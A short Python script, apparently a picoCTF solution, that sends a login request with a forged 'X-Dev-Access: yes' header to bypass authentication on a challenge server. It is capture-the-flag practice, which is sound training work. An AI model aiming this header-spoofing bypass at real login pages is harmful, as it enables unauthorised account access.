import requests

payload = {'email': 'ctf-player@picoctf.org', 'password': 'test'}

r = requests.post("http://amiable-citadel.picoctf.net:55318/login", data=payload, headers={'X-Dev-Access': 'yes'})

print(r.content)